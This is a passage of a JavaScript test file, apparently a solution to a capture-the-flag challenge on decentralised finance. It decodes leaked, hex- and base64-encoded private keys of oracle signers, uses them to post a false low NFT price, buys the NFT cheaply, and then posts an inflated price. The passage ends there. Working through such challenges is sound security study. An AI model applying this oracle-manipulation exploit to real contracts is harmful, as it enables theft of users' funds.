...
describe('Compromised challenge', function () {
  ...
  it('Execution', async function () {
    ...
    let string1 = Buffer.from(snippet1.split(' ').join(''), 'hex').toString(
      'utf-8'
    );
    let key1 = Buffer.from(string1, 'base64').toString('utf-8');
    let snippet2 =
      '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34';
    let string2 = Buffer.from(snippet2.split(' ').join(''), 'hex').toString(
      'utf-8'
    );
    let key2 = Buffer.from(string2, 'base64').toString('utf-8');

    // Post new prices
    const signer1 = new ethers.Wallet(key1, ethers.provider);
    const signer2 = new ethers.Wallet(key2, ethers.provider);

    const ATTACKED_PRICE = 1n * 10n ** 15n;

    await oracle.connect(signer1).postPrice('DVNFT', ATTACKED_PRICE);
    await oracle.connect(signer2).postPrice('DVNFT', ATTACKED_PRICE);

    await exchange.connect(player).buyOne({ value: ATTACKED_PRICE });

    await oracle
      .connect(signer1)
      .postPrice('DVNFT', INITIAL_NFT_PRICE + ATTACKED_PRICE);
    await oracle
      .connect(signer2)
      .postPrice('DVNFT', INITIAL_NFT_PRICE + ATTACKED_PRICE);
